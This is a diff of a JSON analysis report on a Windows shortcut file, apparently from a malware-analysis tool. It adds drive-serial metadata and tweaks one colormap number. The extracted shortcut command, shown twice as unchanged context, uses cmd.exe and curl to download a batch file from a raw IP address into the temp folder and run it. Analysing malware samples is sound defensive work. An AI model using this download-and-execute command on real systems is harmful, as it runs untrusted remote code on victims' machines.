@@ -19,7 +19,7 @@
               3.9636834421390494,
               2.7732601197721642,
               3.90956638799274,
-              3.724934445926068
+              3.724934445926067
             ]
           },
           "type": "colormap"
@@ -113,6 +113,9 @@
             "shortcut": {
               "command_line": [
                 "C:\\Windows\\System32\\cmd.exe /c \"curl http://121.5.28.63/cmd.txt > %temp%\\\\cmd.bat && %temp%\\\\cmd.bat\""
+              ],
+              "drive_serial": [
+                "F63EB37C"
               ],
               "machine_id": [
                 "desktop-gutn2mb"
@@ -229,6 +232,13 @@
           "heur_id": null,
           "signatures": [],
           "value": "C:\\Windows\\System32\\cmd.exe /c \"curl http://121.5.28.63/cmd.txt > %temp%\\\\cmd.bat && %temp%\\\\cmd.bat\""
+        }
+      ],
+      "file.shortcut.drive_serial": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "F63EB37C"
         }
       ],
       "file.shortcut.machine_id": [
